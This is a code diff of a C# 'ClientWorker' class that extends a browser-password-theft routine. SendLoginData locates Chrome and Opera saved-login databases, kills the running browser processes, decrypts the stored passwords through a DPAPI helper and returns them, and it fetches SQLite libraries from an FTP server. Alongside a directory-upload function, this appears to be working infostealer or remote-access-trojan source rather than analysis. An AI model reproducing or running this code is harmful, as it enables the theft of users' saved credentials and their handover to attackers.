@@ -1,20 +1,17 @@
-﻿using System;
+﻿using Interfaces;
+using Interfaces.Users;
+using Service;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
-using System.Net.Security;
-using System.Net.Sockets;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using Interfaces;
-using Interfaces.Users;
-using Service;
 
 namespace ClientWorker
 {
-	public class Functions : IUser
+    public class Functions : IUser
 	{
         public void UploadDirectory(string dirPath, string uploadPath)
         {
@@ -249,13 +246,56 @@ namespace ClientWorker
 
         public List<LoginData> SendLoginData(string path)
         {
-            if (string.IsNullOrWhiteSpace(path))
-                path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Local\Google\Chrome\User Data\Default\Login Data";
+            Log.Send("SendLoginData()");
+            List<LoginData> result = new List<LoginData>();
+            string operaLoginDataPath = "";
+
             if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\SQLite.Interop.dll"))
                 FtpClient.DownloadF("SQLite.Interop.dll", Path.GetDirectoryName(Application.ExecutablePath) + "\\");
             if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\System.Data.SQLite.dll"))
                 FtpClient.DownloadF("System.Data.SQLite.dll", Path.GetDirectoryName(Application.ExecutablePath) + "\\");
-            return DPAPI.GetPasswords(path);
+
+            if (string.IsNullOrWhiteSpace(path))
+            {
+                path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
+                operaLoginDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data";
+
+                Log.Send("ChromePath: " + path);
+                Log.Send("operaLoginDataPath: " + operaLoginDataPath);
+
+                if (File.Exists(path))
+                {
+                    try
+                    {
+                        foreach (Process proc in Process.GetProcessesByName("chrome"))
+                        {
+                            proc.Kill();
+                        }
+                        result.AddRange(DPAPI.GetPasswords(path));
+                        Log.Send("ChromeGetLoginData: " + result.Count);
+                    } catch (Exception ex) { }
+                }
+
+                if (File.Exists(operaLoginDataPath))
+                {
+                    try
+                    {
+                        foreach (Process proc in Process.GetProcessesByName("opera"))
+                        {
+                            proc.Kill();
+                        }
+                        var operaLoginData = DPAPI.GetPasswords(operaLoginDataPath);
+                        result.AddRange(DPAPI.GetPasswords(operaLoginDataPath));
+                        Log.Send("OperaGetLoginData: " + operaLoginData.Count);
+                    } catch (Exception ex) { }
+                }
+            }
+            else
+            {
+                if (File.Exists(path)) result.AddRange(DPAPI.GetPasswords(path));
+            }
+
+            return result;
         }
     }
 }
